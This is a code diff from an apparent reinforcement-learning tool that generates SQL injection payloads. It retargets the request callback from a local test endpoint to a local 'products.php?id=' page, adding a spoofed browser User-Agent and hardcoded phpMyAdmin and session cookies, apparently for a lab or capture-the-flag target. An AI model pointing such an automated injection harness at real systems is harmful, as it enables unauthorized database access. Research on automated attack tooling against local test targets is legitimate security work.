@@ -6,10 +6,10 @@ from sql_parser.sql_data_service import SQLDataService
 from rl.ddpg import DDPG
 from rl.environment import Environment
 
-ACTION_SIZE = 40
+ACTION_SIZE = 20
 STATE_SIZE = 500
 
-IP = '127.0.0.1'
+IP = 'localhost'
 
 # Skips lowercase alphabet as SQL is case-insensitive.
 visible_uppercase_chars = [chr(i) for i in range(32, 97)] + \
@@ -42,7 +42,10 @@ environment = Environment(
     encoded_payloads=encoded_payloads,
     columns=columns, tables=tables,
     send_request_callback= lambda payload:
-        requests.get(f'http://{IP}:5000/comments_single_column?score={payload}'))
+        requests.get(f'http://{IP}/products.php?id={payload}', headers={
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
+            'cookie': 'phpMyAdmin=e50db933ce5df034826b4eada2463ade; pma_lang=en; PHPSESSID=64d8bd0e4d00a133245ad660c5d542b9; {flag}=33e8075e9970de0cfea955afd4644bb2'
+        }))
         #requests.post(f'http://localhost:3000/rest/product/search',data={'q': payload})
         #requests.post('http://localhost:3000/rest/user/login', data={
         #    'email': payload
